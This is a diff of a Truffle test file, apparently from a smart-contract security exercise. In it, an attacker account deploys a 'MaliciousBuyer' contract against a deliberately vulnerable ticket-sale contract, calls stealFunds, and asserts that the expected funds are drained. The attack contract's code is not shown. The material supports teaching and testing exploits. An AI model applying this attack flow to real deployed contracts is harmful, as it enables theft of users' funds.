@@ -1,45 +1,47 @@
-const { BN, expectEvent, expectRevert } = require('@openzeppelin/test-helpers')
+const { BN, balance, ether } = require('@openzeppelin/test-helpers')
 const VulnerableTicketSale = artifacts.require('VulnerableTicketSale')
-const MaliciousBuyer = artifacts.require('MaliciousBuyer')
+const AttackContract = artifacts.require('MaliciousBuyer')
+
+const computeFee = async receipt =>
+  new BN(receipt.gasUsed * (await web3.eth.getGasPrice()))
+
 
 contract('VulnerableTicketSale', accounts => {
 
-  const attacker = accounts[1]
+  const TICKET_PRICE = ether('0.1')
+
+  const eve = accounts[1]
+  const bob = accounts[2]
 
   let vulnerableTicketSale
-  let maliciousBuyer
+  let attackContract
+
 
   before(async () => {
+
+    // get address of vulnerable contract and send some funds
     vulnerableTicketSale = await VulnerableTicketSale.deployed()
-    maliciousBuyer = await MaliciousBuyer.new(vulnerableTicketSale.address)
+    await vulnerableTicketSale.send(ether('1.234'), { from: bob })
+
+    // deploy the attack contract using the attacker's account
+    attackContract = await AttackContract.new(vulnerableTicketSale.address, { from: eve })
   })
 
-  it('should have all funds stolen', async () => {
 
-    const fundsToSend = web3.utils.toWei('1', 'ether')
-    const ticketsBought = 1
+  it('should have most of its funds stolen', async () => {
 
-    // fund the vulnerable contract
-    await vulnerableTicketSale.send(fundsToSend, { from: accounts[0] })
-    const balanceBeforeAttack = await web3.eth.getBalance(vulnerableTicketSale.address)
-    assert.equal(balanceBeforeAttack, fundsToSend, 'vulnerable contract should have funds')
+    // get balances before the attack and compute the expected amount of stolen funds
+    const vulnerableBalance = await balance.current(vulnerableTicketSale.address)
+    const expectedStolenFunds = vulnerableBalance.sub(vulnerableBalance.mod(TICKET_PRICE))
+    const eveBalanceBefore = await balance.current(eve)
 
-    // perform the attack
-    await maliciousBuyer.buyTickets(
-      ticketsBought,
-      { from: attacker, value: ticketsBought * web3.utils.toWei('0.1', 'ether') })
+    // execute the attack
+    const tx = await attackContract.stealFunds({ from: eve, value: TICKET_PRICE })
 
-    assert.equal(
-      await vulnerableTicketSale.getTicketsSold(maliciousBuyer.address),
-      ticketsBought,
-      'malicious buyer should have bought tickets')
+    // get balance after the attack and compute the actual amount of stolen funds
+    const eveBalanceAfter = await balance.current(eve)
+    const stolenFunds = eveBalanceAfter.sub(eveBalanceBefore).add(await computeFee(tx.receipt))
 
-    await maliciousBuyer.getRefund(ticketsBought, { from: attacker, gas: 6721975, gasPrice: 1 })
-
-    const balanceAfterAttack = await web3.eth.getBalance(vulnerableTicketSale.address)
-    console.log(balanceAfterAttack)
-    // assert.equal(balanceAfterAttack, new BN('0 ether'), 'vulnerable contract should have funds stolen')
-
-    assert.equal(1, 0, 'xxx')
+    assert.equal(stolenFunds.toString(), expectedStolenFunds.toString(), 'funds should have been stolen')
   })
 })
